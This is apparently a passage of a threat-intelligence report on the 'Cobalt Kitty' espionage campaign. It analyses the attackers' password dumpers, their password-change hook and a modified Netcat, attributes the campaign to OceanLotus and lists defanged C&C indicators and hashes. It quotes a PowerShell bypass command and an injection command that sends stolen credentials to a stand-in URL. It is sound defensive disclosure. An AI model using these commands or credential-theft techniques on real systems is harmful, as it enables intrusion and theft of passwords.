original\nMimikatz payload taken from GitHub:\n\n\n-----\n\n###### GetPassword_x64\n\nGetPassword_x64 is a known, publicly available password dumping tool by the K8Team.\nIt was one of the tools used by Chinese “Emissary Panda” group, also known as “Threat Group[3390 (TG-3390)” in Operation Iron Tiger, as reported by TrendMicro.](https://www.erai.com/CustomUploads/ca/wp/2015_12_wp_operation_iron_tiger.pdf)\n\nIt is interesting to notice that this tool’s hash, was the one out of the two hashes that were\nknown to threat intelligence engines at the time of the attack:\n\nlog.exe 7f812da330a617400cb2ff41028c859181fe663f\n\n[GetPassword_x64]\n\nIt’s even more interesting to see that even in 2017, almost three years after it was first uploaded\nto VirusTotal, and two years after the same tool has been reported being used in an APT, it still\nhas a very low detection rate and it is misclassified as adware or Mimikatz:\n\nBelow is a screenshot of the tool’s output, dumping local users’ passwords:\n\n|log.exe [GetPassword_x64]|7f812da330a617400cb2ff41028c859181fe663f|\n|---|---|\n\n\n-----\n\n###### Custom “HookPasswordChange”\n\nIn an attempt to remain persistent on the network, the attackers introduced a new tool that alerts\nthem if a compromised account password was changed. The attackers borrowed the idea and a\n[lot of the code from a known publicly available tool called “HookPasswordChange”, which was](https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/)\n[inspired by a previous work done by “carnal0wnage”. The original tool hooks Windows](http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html)\n“PasswordChangeNotify” in Windows’ default password filter (rassfm.dll). By doing so, every\ntime this function is called, it will be redirected to the malicious PasswordChangeNotify function,\nwhich in turn will copy the changed password to a file and then return the execution back to the\noriginal PasswordChangeNotify function, allowing the password to be changed.\n\nThe observed payloads are:\n\n**SRCHUI.dll - 29BD1BAC25F753693DF2DDF70B83F0E183D9550D**\n**Adrclients.dll - FC92EAC99460FA6F1A40D5A4ACD1B7C3C6647642**\n\nAs can be seen, the internal names of the DLL files is “Password.exe”.\n\n\n-----\n\nThe exported functions of the malicious DLLs include the malicious code to hook rassfm.dll’s\npassword change functions:\n\nFollowing are strings extracted from the malicious binaries, indicating the hooking of rassfm.dll’s\n_PasswordChangeNotify functions:_\n\nHowever, the code was not taken as is. The attackers made quite a few modifications, most of\nthem are “cosmetic”, like changing functions names and logging strings, as well as adding\nfunctionality to suit their needs.\n\n###### Custom Outlook credential dumper\n\nThe attackers showed particular interest in obtaining the Outlook passwords of their victims. To\ndo so, they wrote a custom credential dumper in PowerShell that focused on Outlook. Analysis\nof the code clearly shows that the attackers borrowed code from a [known Windows credential](http://www.oxid.it/downloads/vaultdump.txt)\n[dumper](http://www.oxid.it/downloads/vaultdump.txt) and modified it to fit their needs.\nThe payloads used are the following PowerShell scripts:\n\n###### C:\\ProgramData\\doutlook.ps1 - EBDD6059DA1ABD97E03D37BA001BAD4AA6BCBABD\n\n\n-----\n\n###### C:\\ProgramData\\adobe.dat - B769FE81996CBF7666F916D741373C9C55C71F15\n\nSince PowerShell execution was disabled at this stage of the attack, they attackers executed\n[the PowerShell script via a tool called PSUnlock that enabled them to bypass PowerShell](https://github.com/p3nt4/PSUnlock)\nexecution restrictions. This was done as follows:\n_rundll32 PShdll35.dll,main -f doutlook.ps1_\n\nThe dumped strings of the Rundll32 process teach us two important things:\n\n1. The attackers wrote a binary tool and then ported it to PowerShell, using PowerSploit’s\n\n[“Invoke-ReflectivePEInjection”.](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)\n2. The attackers preconfigured the tools to write the output to ProgramData folder, where\n\nthey hid most of their tools\n\nDoutlook.ps1:\n_(0x2f815f0 (194): Invoke-ReflectivePEInjection -PEBytes $RawPEFile -ExeArgs '-o_\n**_c:\\programdata\\log.txt' -ForceASLR_**\n\nExample of the output of the the PowerShell script shows the direct intent to obtain Outlook\npasswords:\n\n\n-----\n\nThe tool is designed to recover Outlook passwords stored in Windows registry:\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging_\n_Subsystem\\Profiles_\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook_\n\nThis technique is well known and was used in different tools such as SecurityXploded’s:\n[http://securityxploded.com/outlookpasswordsecrets.php](http://securityxploded.com/outlookpasswordsecrets.php)\n[http://securityxploded.com/outlook-password-dump.php](http://securityxploded.com/outlook-password-dump.php)\n\n[In addition, they also used borrowed code from Oxid’s Windows Vault Password Dumper,](http://www.oxid.it/downloads/vaultdump.txt)\nwritten by Massimiliano Montoro, as can be clearly seen in the dumped strings from memory:\n\n\n-----\n\n[The original code from Oxid’s Windows Vault Password Dumper](http://www.oxid.it/downloads/vaultdump.txt) matches the strings found in\nmemory:\n\n###### Custom Windows credential dumper\n\nThe attackers wrote a custom Windows credential dumper, which is a patchwork of two known\ndumping tools along with their own code. This password dumper borrows much of its code from\n[Oxid’s Windows Vault Password Dumper](http://www.oxid.it/downloads/vaultdump.txt) [as well as Oxid’s creddump project.](http://www.oxid.it/creddump.html)\n\nThe observed payloads are:\n\n\n-----\n\n**Adrclients.ps1 - 6609A347932A11FA4C305817A78638E07F04B09F**\n**KB471623.exe - 6609A347932A11FA4C305817A78638E07F04B09F**\n\nThe PowerShell version reveals the command-line arguments that the attackers need to supply\nthe program:\nInvoke-ReflectivePEInjection -PEBytes $RawPEFile -ExeArgs '/s http://example.com/q= /l\n**C:\\programdata\\log.txt /d C:\\programdata\\adrclients.dll' -ForceASLR}**\n\n  - **URL - to post the dumped credentials in GET parameters**\n\n  - **Log file - log all dumped credentials in a file called “log.txt” created in programdata**\n\n  - **DLL - to load HookPasswordChange payload**\n\nThis above command line arguments do not appear in the code of the two aforementioned\nOxid’s projects. It was added by the attackers in order to include exfiltration over HTTP along\nwith the ability to combine the HookPasswordChange functionality.\n\nExample of strings found in the binaries of the custom credential dumper:\n\n##### Modified NetCat\n\n###### The attackers used a customized version of the famous “Netcat” aka, tcp/ip \"Swiss Army knife\", which was taken from GitHub. The tool was executed on very few machines,\nand was uploaded to the compromised machines by the backdoor (goopdate.dll):\n\n\n-----\n\n**File names: kb74891.exe, kb-10233.exe**\n**SHA-1 Hash: c5e19c02a9a1362c67ea87c1e049ce9056425788**\n###### The attackers named the executable “kb-10233.exe”, masquerading as a Windows update file. Netcat is usually detected by most of security products as a hacktool. however, this version is only detected by one antivirus vendor, and this is most likely the reason the attackers chose to use it.  https://virustotal.com/en/file/bf01148b2a428bf6edff570c1bbfbf51a342ff7844ceccaf22c0 e09347d59a54/analysis/\n\n##### Custom IP check tool\n\n###### The attackers used an unknown tool, whose purpose is simply to check the external IP of the compromised machine: \n\n\n-----\n\n###### It’s interesting that the attackers renamed the executable twice from ip.exe to dllhost.exe or cmd.exe, probably to make it appear less suspicious by giving it common Windows executables names:  c:\\programdata\\dllhost.exe - 6aec53554f93c61f4e3977747328b8e2b1283af2 c:\\programdata\\cmd.exe - 6aec53554f93c61f4e3977747328b8e2b1283af2 c:\\programdata\\ip.exe - 6aec53554f93c61f4e3977747328b8e2b1283af2\n The IP tool was deployed by the attackers in the attack’s second phase. The product name “WindowsFormsApplication1”, strongly suggests that the tool was written using Microsoft’s .NET framework:\n\n The code is very short and straight-forward and clearly reveals the tool’s purpose:  checking the external IP of the compromised machine using the well-known IP service ipinfo.io.\n\n\n-----\n\n-----\n\n# Operation Cobalt Kitty\n\n### Threat Actor Profile &\n Indicators of Compromise\n\n##### By: Assaf Dahan\n\n\n-----\n\n#### Attribution\n\nIn this APT, the threat actor was very aware of the risks of exposure and tried to combat\nattribution as much as possible. This is often the case in this type of large-scale cyber\nespionage operations. At the time of the attack, there weren’t many classic indicators of\ncompromise (IOCs) that could lead to attribution. However, at the same time, the threat actors\nbehind Operation Cobalt Kitty left enough “behavioral fingerprints” to suspect the involvement of\nthe OceanLotus Group (which also goes by the names APT-C-00, SeaLotus and APT32),\nwhich was first documented by [Qihoo 360's SkyEye Labs in 2015](https://ti.360.com/upload/report/file/OceanLotusReport.pdf) and further researched by\n[other security companies, including FireEye’s report. Reports of the group’s activity in Asia date](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\n[back to 2012, attacking Chinese entities. Over the years, the group was observed attacking a](https://web.archive.org/web/20151013184335/http:/drops.wooyun.org/papers/6335)\nwide spectrum of targets in other Asian countries (Philippines and Vietnam). Cybereason\nconcludes that the tactics, techniques and procedures (TTPs) observed throughout operation\nCobalt Kitty are consistent with the group’s previous APT campaigns in Asia.\n\nThe Lotus Group appears to have a tendency of using similar and even identical names for their\npayloads (seen in their PowerShell payloads, Denis backdoor and fake Flash installers). In\naddition, they also used similar anonymization services for their domains repeatedly. That type\nof “small” details also played a role in attributing Operation Cobalt Kitty to the OceanLotus\nGroup.\n\nLastly, during the investigation, Cybereason noticed that some of the C&C domains and IPs\nstarted to emerge on VirusTotal and other threat intelligence engines, with payloads that were\nnot observed during Cobalt Kitty. This was a cutting proof that Cobalt Kitty was not an isolated\nAPT, but part of something bigger. Example of the C&C domains and IPs used by the group\nacross different APT campaigns and caught in the wild:\n\n*.chatconnecting(.)com teriava(.)com 23.227.196(.)210\nblog.versign(.)com tonholding(.)com 104.237.218(.)72\nvieweva(.)com nsquery(.)net 45.114.117(.)137\ntulationeva(.)com notificeva(.)com\n\nSome of these domains were also mentioned in FireEye’s [APT32 report, further confirming our](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\nsuspicions that the group behind the attack is the OceanLotus Group.\n\nThe group includes members who are fluent in at least two Asian languages. This claim is\nsupported by the language used in the spear-phishing emails, which appear to be written by\nnative speakers. In addition, the language localization settings found in few of the payloads\nsuggest that the malware authors compiled the payloads on machines with Asian languages\n\n©2017 Cybereason Inc. All rights reserved. 1\n\n|*.chatconnecting(.)com blog.versign(.)com vieweva(.)com tulationeva(.)com|teriava(.)com tonholding(.)com nsquery(.)net notificeva(.)com|23.227.196(.)210 104.237.218(.)72 45.114.117(.)137|\n|---|---|---|\n\n\n-----\n\nsupport. The threat actors are not likely native English speakers since multiple typos were found\nin their payloads.\n\nFor example, the following typo was observed in the file metadata of one of the backdoors.\nNotice the “Internal Name” field (“Geogle Update”):\n\n#### Threat Actor Profile\n\nThe attackers behind **Operation Cobalt Kitty were extremely persistent. Even when their**\ncampaign was exposed, the attackers did not give up. They took “pauses” that lasted between\n48 hours and four weeks and used the downtime to learn from their “mistakes” and develop\nworkarounds before resuming the APT campaign.\n\nThe members of the **OceanLotus Group demonstrated a remarkable ability to quickly adapt,**\nintroduce new tools and fine tune existing ones to bypass security solutions and avoid detection.\nThe high number of payloads and the elaborate C2 infrastructure used in this attack can be\nindicative of the resources that the attackers had at their disposal. Simultaneously orchestrating\nmultiple APT campaigns of such magnitude and sophistication takes time, financial resources\nand a large team who can support it.\n\n###### Threat actor’s main characteristics \nHere are the main characteristics that can help profile the threat actor:\n\n  - **Motivation**   - Based on the nature of the attack, the proprietary information that the\n\nattackers were after and the high-profile personnel who were targeted, Cybereason\nconcluded the main motivation behind the attack was cyber espionage. The attacker\nsought after specific documents and type of information. This is consistent with [previous](https://web.archive.org/web/20151013184335/http:/drops.wooyun.org/papers/6335)\n[reports](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html) about the group’s activity show that the group has a very wide range of targets,\nspanning from government agencies, media, business sector, and more.\n\n©2017 Cybereason Inc. All rights reserved. 2\n\n\n-----\n\n  - **Operational working hours**   - Most of the malicious activity was mostly done around\n\nnormal business hours (8AM-8PM). Very little active hacking activity was detected\nduring weekends. The attackers showed a slight tendency to carry out hacking\noperations towards the afternoon and evening time. These observations can suggest the\nfollowing:\n\n      - Time zone(s) proximity.\n\n      - An institutionalized threat actor (possibly nation-state)\n\n  - **Outlook backdoor and data exfiltration - One of the most interesting tools introduced**\n\nby the attackers was the Outlook backdoor, which used Outlook as a C2 channel. This\nbackdoor has not been publicly documented and is one of the most unique TTPs with\nregards to the threat actor. Outlook backdoors are not a new concept and have been\n[observed in different APTs in the past. However, this specific type of Outlook backdoor](https://www.cybereason.com/cybereason-labs-research-a-new-persistent-attack-methodology-targeting-microsoft-owa/)\nis can be considered as one of the “signature tools” of the OceanLotus Group.\n\n  - **Publicly available tools**   - The attackers showed a clear preference to use publicly\n\navailable hacking tools and frameworks. Beyond being spared the hassle of creating a\nnew tool, it is much harder to attribute a tool that can be used by anyone rather than a\ncustom-made tool. However, the attackers should not be considered script-kiddies. Most\nof the publicly available tools were either obfuscated, modified and even merged with\nother tools to evade antivirus detection. This type of customization requires good coding\nskills and understanding of how those tools work.\n\n  - **Cobalt Strike usage in APT -** [Cobalt Strike](https://www.cobaltstrike.com/) is a commercial offensive security\n\nframework designed to simulate complex attacks and is mainly used by security\nprofessionals in security audits and penetration testing. The **OceanLotus Group** [was](https://read01.com/yxjnL2.html)\n[previously documented](https://read01.com/yxjnL2.html) [using Cobalt Strike as one of its main tools. Other Large scale](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html)\nAPTs using Cobalt Strike have been reported before, such as [APT-TOCS](http://www.antiy.net/p/analysis-on-apt-to-be-attack-that-focusing-on-chinas-government-agency/) (could be\n[related to OceanLotus), Ordinaff, Carbanak Group, and the](https://www.symantec.com/connect/blogs/odinaff-new-trojan-used-high-level-financial-attacks) [Cobalt Group.](http://securityaffairs.co/wordpress/53758/cyber-crime/jackpotting-attacks.html)\n\n  - **Custom-built backdoors -** The threat actor used very sophisticated and stealthy\n\nbackdoors (Denis & Goopy) that were written by highly skilled malware authors. During\nthe attack, the authors introduced new variants of these backdoors, indicating “on-thefly” development capabilities. Developing such state-of-the-art backdoors requires skillful\nmalware authors, time and resources. In addition, both the Denis and Goopy backdoors\nused DNS Tunneling for C2 communication. The OceanLotus Group is known to have a\n[backdoor dubbed SOUNDBITE by FireEye](https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html) that use this stealthy technique. However, no\npublic analysis reports of SOUNDBITE is available to the time of writing this report.\n\n  - **Exploiting DLL hijacking in trusted applications - The attackers exploited three DLL-**\n\nhijacking vulnerabilities in legitimate applications from trusted vendors: **Microsoft,**\n**Google and Kaspersky. This further indicates the group’s emphasis on vulnerability**\nresearch. DLL-hijacking / Side-loading attacks are not uncommon in APTs, some of\nwhich are also carried out by nation-state actors and advanced cyber-crime groups.\n\n©2017 Cybereason Inc. All rights reserved. 3\n\n\n-----\n\nThere have been reports in the past of [GoogleUpdate exploited by PlugX](https://www.mcafee.com/us/resources/reports/rp-quarterly-threat-q3-2014.pdf) by [Chinese](https://www.ipa.go.jp/files/000057175.pdf)\n[threat actors as well as the](https://www.ipa.go.jp/files/000057175.pdf) [Bookworm RAT](http://researchcenter.paloaltonetworks.com/2015/11/bookworm-trojan-a-model-of-modular-architecture/) exploiting Microsoft and Kaspersky\n[applications in APTs targeting Asia.](http://researchcenter.paloaltonetworks.com/2015/11/attack-campaign-on-the-government-of-thailand-delivers-bookworm-trojan/)\n\n  - **Insisting on fileless operation**   - While fileless delivery infrastructure is not a feature\n\nthat can be attributed to one specific group, it is still worth mentioning since the attackers\nwent out of their way to restore the script-based PowerShell / Visual Basic operation,\nespecially after PowerShell execution had been disabled in the entire organization.\n\n  - **C&C infrastructure**\n\n      - **Divide and conquer**      - Each tool communicated with different sets of C&C\n\nservers domains, which usually came in triads. For instance, Cobalt strike\npayloads communicated with certain sets of IPs/domains while the backdoors\ncommunicated with different sets of IPs/domains.\n\n      - **Re-use of domains and IPs across campaigns - Quite a few domains and IPs**\n\nthat were observed in Operation Cobalt Kitty were found in-the-wild, attacking\nother targets. It’s rather peculiar why the threat actor re-used the same domains\nand IPs. It could be assumed that the malware operators wanted to have\ncentralized C&C servers per tool or tools, where they could monitor all of their\ncampaigns from dedicated servers.\n\n      - **Anonymous DNS records**      - Most of the domains point to companies that\n\nprovide DNS data privacy and anonymization, such as [PrivacyProtect](http://privacyprotect.org/) and\n[PrivacyGuardian.](https://www.privacyguardian.org/)\n\n      - **C&C server protection**      - Most of the C&C servers IP addresses are protected\n\nby [CloudFlare](https://www.cloudflare.com/) and [SECURED SERVERS LLC.](https://securedservers.com/)\n\n###### OceanLotus Group activity in Asia \n\nAs part of the analysis of the domains and IPs that were used in this operation, Cybereason\nfound samples that were caught “in-the-wild” (that were **not part of Operation Cobalt Kitty).**\nAnalysis of those samples clearly indicates the involvement of the threat actor in Asia and\nVietnam in particular. Both Qihoo 360 and FireEye demonstrate in their reports that the threat\nactor is involved in campaigns in different Asian countries, such as Vietnam, China, and the\nPhilippines.\n\nMost of the samples caught in-the-wild seem to target Vietnamese speakers. Some of the\nsamples exhibit clear evidence of targeting Vietnamese entities. This conclusion is derived from\nthe file names and file contents that are written in Vietnamese, as shown in the examples below:\n\n**File Name: Điện thoại bị cháy.doc**\n**SHA-1: 38297392df481d2ecf00cc7f05ce3361bd575b04**\n**Malicious Domain / IP: 193.169.245(.)137**\n\n©2017 Cybereason Inc. All rights reserved. 4\n\n\n-----\n\n**File Name: ID2016.doc**\n**SHA-1: bfb3ca77d95d4f34982509380f2f146f63aa41bc**\n**Malicious Domain / IP: support.chatconnecting(.)com**\n\n**File Name:** Giấy yêu cầu bồi thường mới 2016 - Hằng.doc (Translation: “New Claim Form 2016”)\n**SHA-1: A5bddb5b10d673cbfe9b16a062ac78c9aa75b61c**\n**Malicious Domain / IP: blog.versign(.)info**\n\n©2017 Cybereason Inc. All rights reserved. 5\n\n\n-----\n\n#### Indicators of Compromise (IOCs)\n\n###### Malicious files\n\n Backdoors\n\n**File name** **SHA-1 hash**\n\nMsfte.dll be6342fc2f33d8380e0ee5531592e9f676bb1f94\n------------- 638b7b0536217c8923e856f4138d9caff7eb309d\nVariant of dcbe007ac5684793ea34bf27fdaa2952c4e84d12\n\n43b85c5387aafb91aea599782622eb9d0b5b151f\n\nBackdoor.Win32.Denis\n\nGoopdate.dll 9afe0ac621c00829f960d06c16a3e556cd0de249\n----------------- 973b1ca8661be6651114edf29b10b31db4e218f7\nGoopy backdoor 1c503a44ed9a28aad1fa3227dc1e0556bbe79919\n\n2e29e61620f2b5c2fd31c4eb812c84e57f20214a\nc7b190119cec8c96b7e36b7c2cc90773cffd81fd\n185b7db0fec0236dff53e45b9c2a446e627b4c6a\nef0f9aaf16ab65e4518296c77ee54e1178787e21\n\nproduct_info.dll 3cf4b44c9470fb5bd0c16996c4b2a338502a7517\n\n[Backdoor exploiting DLL-hijacking\nagainst Kaspersky Avpia]\n\nVbaProject.OTM 320e25629327e0e8946f3ea7c2a747ebd37fe26f\n\n[Outlook Macro]\n\nsunjavascheduler.ps1 0d3a33cb848499a9404d099f8238a6a0e0a4b471\nsndVolSSO.ps1 c219a1ac5b4fd6d20a61bb5fdf68f65bbd40b453\n\n91e9465532ef967c93b1ef04b7a906aa533a370e\n\nSCVHost.ps1\nfhsvcs.ps1\nGoztp.ps1\n\n[PowerShell versions of the Denis\n/ Goopy backdoors]\n\n###### Cobalt Strike Beacons\n\n©2017 Cybereason Inc. All rights reserved. 6\n\n|Malicious files|Col2|\n|---|---|\n|Backdoors||\n|File name|SHA-1 hash|\n|Msfte.dll ------------- Variant of Backdoor.Win32.Denis|be6342fc2f33d8380e0ee5531592e9f676bb1f94 638b7b0536217c8923e856f4138d9caff7eb309d dcbe007ac5684793ea34bf27fdaa2952c4e84d12 43b85c5387aafb91aea599782622eb9d0b5b151f|\n|Goopdate.dll ----------------- Goopy backdoor|9afe0ac621c00829f960d06c16a3e556cd0de249 973b1ca8661be6651114edf29b10b31db4e218f7 1c503a44ed9a28aad1fa3227dc1e0556bbe79919 2e29e61620f2b5c2fd31c4eb812c84e57f20214a c7b190119cec8c96b7e36b7c2cc90773cffd81fd 185b7db0fec0236dff53e45b9c2a446e627b4c6a ef0f9aaf16ab65e4518296c77ee54e1178787e21|\n|product_info.dll [Backdoor exploiting DLL-hijacking against Kaspersky Avpia]|3cf4b44c9470fb5bd0c16996c4b2a338502a7517|\n|VbaProject.OTM [Outlook Macro]|320e25629327e0e8946f3ea7c2a747ebd37fe26f|\n|sunjavascheduler.ps1 sndVolSSO.ps1 SCVHost.ps1 fhsvcs.ps1 Goztp.ps1 [PowerShell versions of the Denis / Goopy backdoors]|0d3a33cb848499a9404d099f8238a6a0e0a4b471 c219a1ac5b4fd6d20a61bb5fdf68f65bbd40b453 91e9465532ef967c93b1ef04b7a906aa533a370e|\n|Cobalt Strike Beacons||\n\n\n-----\n\n|File name|SHA-1 hash|\n|---|---|\n|dns.exe|cd675977bf235eac49db60f6572be0d4051b9c07|\n|msfte.dll|2f8e5f81a8ca94ec36380272e36a22e326aa40a4|\n|FVEAPI.dll|01197697e554021af1ce7e980a5950a5fcf88318|\n|sunjavascheduler.ps1 syscheck.ps1 dns.ps1 activator.ps1 nvidia.db|7657769f767cd021438fcce96a6befaf3bb2ba2d Ed074a1609616fdb56b40d3059ff4bebe729e436 D667701804CA05BB536B80337A33D0714EA28129 F45A41D30F9574C41FE0A27CB121A667295268B2 7F4C28639355B0B6244EADBC8943E373344B2E7E|\n|Malicious Word Documents ***Some of the phishing emails and Word documents were very targeted and personalized, therefore, they are not listed here for privacy reasons||\n|File name|SHA-1 hash|\n|CV.doc Complaint letter.doc License Agreement.doc|[redacted]|\n|Loader scripts||\n|File name|SHA-1 hash|\n|syscheck.vbs|62749484f7a6b4142a2b5d54f589a950483dfcc9|\n|SndVolSSO.txt|cb3a982e15ae382c0f6bdacc0fcecf3a9d4a068d|\n\n\n©2017 Cybereason Inc. All rights reserved. 7\n\n\n-----\n\n|sunjavascheduler.txt|7a02a835016bc630aa9e20bc4bc0967715459daa|\n|---|---|\n|Obfuscated / customized Mimikatz||\n|File name|SHA-1 hash|\n|dllhosts.exe|5a31342e8e33e2bbe17f182f2f2b508edb20933f 23c466c465ad09f0ebeca007121f73e5b630ecf6 14FDEF1F5469EB7B67EB9186AA0C30AFAF77A07C|\n|KB571372.ps1|7CADFB90E36FA3100AF45AC6F37DC55828FC084A|\n|KB647152.exe|7BA6BFEA546D0FC8469C09D8F84D30AB0F20A129|\n|KB647164.exe|BDCADEAE92C7C662D771507D78689D4B62D897F9|\n|kb412345.exe|e0aaa10bf812a17bb615637bf670c785bca34096|\n|kb681234.exe|4bd060270da3b9666f5886cf4eeaef3164fad438|\n|System.exe|33cb4e6e291d752b9dc3c85dfef63ce9cf0dbfbc 550f1d37d3dd09e023d552904cdfb342f2bf0d35|\n|decoded base64 Mimikatz payload|c0950ac1be159e6ff1bf6c9593f06a3f0e721dd4|\n|Customized credential dumpers||\n|File name|SHA-1 hash|\n\n\n©2017 Cybereason Inc. All rights reserved. 8\n\n\n-----\n\n|log.exe [GetPassword_x64]|7f812da330a617400cb2ff41028c859181fe663f|\n|---|---|\n|SRCHUI.dll adrclients.dll [HookPasswordChange]|29BD1BAC25F753693DF2DDF70B83F0E183D9550D FC92EAC99460FA6F1A40D5A4ACD1B7C3C6647642|\n|KB471623.exe [Custom password dumper]|6609A347932A11FA4C305817A78638E07F04B09F|\n|doutlook.ps1 adobe.dat adrclients.ps1 [Custom password dumper]|EBDD6059DA1ABD97E03D37BA001BAD4AA6BCBABD B769FE81996CBF7666F916D741373C9C55C71F15 E64C2ED72A146271CCEE9EE904360230B69A2C1D|\n|Miscellaneous tools||\n|File name|SHA-1 hash|\n|pshdll35.dll pshdll40.dll [PSUnlock - PowerShell Bypass tool]|52852C5E478CC656D8C4E1917E356940768E7184 EDD5D8622E491DFA2AF50FE9191E788CC9B9AF89|\n|KB-10233.exe kb74891.exe [NetCat]|C5e19c02a9a1362c67ea87c1e049ce9056425788 0908a7fbc74e32cded8877ac983373ab289608b3|\n|IP.exe cmd.exe dllhost.exe [IP check Tool]|6aec53554f93c61f4e3977747328b8e2b1283af2|\n\n\n###### Payloads from C&C servers\n\n**URL** **Payload SHA-1 hash**\n\n©2017 Cybereason Inc. All rights reserved. 9\n\n|URL|Payload SHA-1 hash|\n|---|---|\n\n\n-----\n\n|hxxp://104.237.218(.)67:80/icon.ico|6dc7bd14b93a647ebb1d2eccb752e750c4ab6b09|\n|---|---|\n|hxxp://support.chatconnecting(.)com:80/icon.ico|c41972517f268e214d1d6c446ca75e795646c5f2|\n|hxxp://food.letsmiles(.)org/login.txt|9f95b81372eaf722a705d1f94a2632aad5b5c180|\n|hxxp://food.letsmiles(.)org/9niL|5B4459252A9E67D085C8B6AC47048B276C7A6700|\n|hxxp://23.227.196(.)210:80/logscreen.jpg|d8f31a78e1d158032f789290fa52ada6281c9a1f 50fec977ee3bfb6ba88e5dd009b81f0cae73955e|\n|hxxp://45.114.117(.)137/eXYF|D1E3D0DDE443E9D294A39013C0D7261A411FF1C4 91BD627C7B8A34AB334B5E929AF6F981FCEBF268|\n|hxxp://images.verginnet(.)info:80/ppap.png|F0A0FB4E005DD5982AF5CFD64D32C43DF79E1402|\n|hxxp://176.107.176(.)6/QVPh|8FC9D1DADF5CEF6CFE6996E4DA9E4AD3132702C|\n|hxxp://108.170.31(.)69/a|4a3f9e31dc6362ab9e632964caad984d1120a1a7|\n|hxxp://support(.)chatconnecting(.)com/pic.png|bb82f02026cf515eab2cc88faa7d18148f424f72|\n|hxxp://blog.versign(.)info/access/?version=4&lid=[reda cted]&token=[redacted]|9e3971a2df15f5d9eb21d5da5a197e763c035f7a|\n|hxxp://23.227.196(.)210/6tz8|bb82f02026cf515eab2cc88faa7d18148f424f72|\n|hxxp://23.227.196(.)210/QVPh|8fc9d1dadf5cef6cfe6996e4da9e4ad3132702c5|\n|hxxp://45.114.117(.)137/3mkQ|91bd627c7b8a34ab334b5e929af6f981fcebf268|\n|hxxp://176.223.111(.)116:80/download/sido.jpg|5934262D2258E4F23E2079DB953DBEBED8F07981|\n|hxxp://110.10.179(.)65:80/ptF2|DA2B3FF680A25FFB0DD4F55615168516222DFC10|\n|hxxp://110.10.179(.)65:80/download/microsoftp.jpg|23EF081AF79E92C1FBA8B5E622025B821981C145|\n|hxxp://110.10.179(.)65:80/download/microsoft.jpg|C845F3AF0A2B7E034CE43658276AF3B3E402EB7B|\n\n\n©2017 Cybereason Inc. All rights reserved. 10\n\n\n-----\n\n|hxxp://27.102.70(.)211:80/image.jpg|9394B5EF0B8216528CED1FEE589F3ED0E88C7155|\n|---|---|\n\n\n###### C&C IPs\n\n45.114.117(.)137\n104.24.119(.)185\n104.24.118(.)185\n23.227.196(.)210\n23.227.196(.)126\n184.95.51(.)179\n176.107.177(.)216\n192.121.176(.)148\n103.41.177(.)33\n184.95.51(.)181\n23.227.199(.)121\n108.170.31(.)69\n104.27.167(.)79\n104.27.166(.)79\n176.107.176(.)6\n184.95.51(.)190\n176.223.111(.)116\n110.10.179(.)65\n27.102.70(.)211\n\n###### C&C Domains\n\nfood.letsmiles(.)org\nhelp.chatconnecting(.)com\n*.letsmiles(.)org\nsupport.chatconnecting(.)com\ninbox.mailboxhus(.)com\nblog.versign(.)info\nnews.blogtrands(.)net\nstack.inveglob(.)net\ntops.gamecousers(.)com\nnsquery(.)net\ntonholding(.)com\ncloudwsus(.)net\nnortonudt(.)net\nteriava(.)com\ntulationeva(.)com\n\n©2017 Cybereason Inc. All rights reserved. 11\n\n\n-----\n\nvieweva(.)com\nnotificeva(.)com\nimages.verginnet(.)info\nid.madsmans(.)com\nlvjustin(.)com\nplay.paramountgame(.)com\n\n###### Appendix A: Threat actor payloads caught in the wild\n\n**Domain** **Details** **VirusTotal**\n\ninbox.mailboxhus(.)com **File name: Flash.exe** [Link](https://virustotal.com/en/file/9afd2ccb1e2c434d296a6fa54fa5425c827e4172947c05a7db226076996a3715/analysis/)\nsupport.chatconnecting(.)com **SHA-1: 01ffc3ee5c2c560d29aaa8ac3d17f0ea4f6c0c09**\n\n**Submitted: 2016-12-28 09:51:13**\n\n(45.114.117.137)\n\ninbox.mailboxhus(.)com **File name: Flash.exe** [Link](https://virustotal.com/en/file/e19fc649fe55d73eff5b1e3f7180d777fbc5d481855f0b4e8eb0b78a25212353/analysis/)\nsupport.chatconnecting(.)com **SHA-1:**\n\n562aeced9f83657be218919d6f443485de8fae9e\n\n(45.114.117[.]137) **Submitted: 2017-01-18 19:00:41**\n\nsupport.chatconnecting(.)com **URL: hxxp://support(.)chatconnecting.com/2nx7m** [Link](https://virustotal.com/en/url/0c58ccd13809121dc6dabb41efe6126272cde30f86dc162c860123a37f73e67a/analysis/)\n\n**Submitted: 2017-01-20 10:11:47**\n\n(45.114.117[.]137)\n\nsupport.chatconnecting(.)com **File name: ID2016.doc** [Link](https://virustotal.com/en/file/ed67f59d5f92dba80901f0c6ccc0acf92cca1a0d8c33773fd424a503c77e12e7/analysis/)\n\n**SHA-1: bfb3ca77d95d4f34982509380f2f146f63aa41bc**\n\n(45.114.117[.]137) **Submitted: 2016-11-23 08:18:43**\n\nMalicious Word document (Phishing text in Vietnamese)\n\nblog(.)versign(.)info **File name: tx32.dll** [Link](https://virustotal.com/en/file/8f667d56778a2c1d68fc33be1870ea0c5fda7173c8875eddb31a2a4a3b406f55/analysis/)\n\n**SHA-1:**\n\n(23.227.196[.]210) 604a1e1a6210c96e50b72f025921385fad943ddf\n\n**Submitted: 2016-08-15 04:04:46**\n\nblog(.)versign(.)info **File name: Giấy yêu cầu bồi thường mới 2016 - Hằng.doc**\n\n**SHA-1:** [Link](https://virustotal.com/en/file/8c355092c7aaadb11748fd87ce528d3cdb483104e979d9b560af840eb8089f94/analysis/)\n\n(23.227.196[.]210) a5bddb5b10d673cbfe9b16a062ac78c9aa75b61c\n\n**Submitted: 2016-10-06 11:03:54**\n\nMalicious Word document with Phishing text in\nVietnamese\n\n©2017 Cybereason Inc. All rights reserved. 12\n\n|Domain|Details|VirusTotal|\n|---|---|---|\n|inbox.mailboxhus(.)com 